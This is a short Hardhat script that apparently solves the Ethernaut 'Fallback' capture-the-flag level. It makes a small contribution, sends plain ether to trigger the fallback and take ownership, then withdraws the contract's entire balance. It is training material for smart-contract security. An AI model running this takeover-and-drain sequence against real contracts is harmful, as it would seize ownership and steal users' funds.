import { TransactionRequest } from "@ethersproject/providers";
import { ethers } from "hardhat";

const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xDC17C27Ae8bE831AF07CC38C02930007060020F4";

async function main() {
 
const signer = await ethers.getSigner(PLAYER_ADDRESS);

//Fit contract name and address (current lvl instance)
const contract = await ethers.getContractAt("Fallback",CONTRACT_ADDRESS,signer);

//1. Check current ownership
console.log("Current owner is: ", await contract.owner());

//2. Contribute to contract, update the mapping contributions and check.
await contract.contribute({value: ethers.utils.parseEther("0.0001")});
console.log("My contributions are: ", await (await contract.getContribution()).toString());

//3. Send ether to contract, to get to the fallback function. Need to build a transaction.
const tx : TransactionRequest = {
    to: CONTRACT_ADDRESS,
    value: ethers.utils.parseEther("0.0001")
}
await signer.sendTransaction(tx);

//4. Check owner and reduce the balance to 0.
console.log("After tx, now owner is: ", await contract.owner())
await contract.withdraw();
console.log("Current balance of the contract: ", await (await contract.provider.getBalance(CONTRACT_ADDRESS)).toString());

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
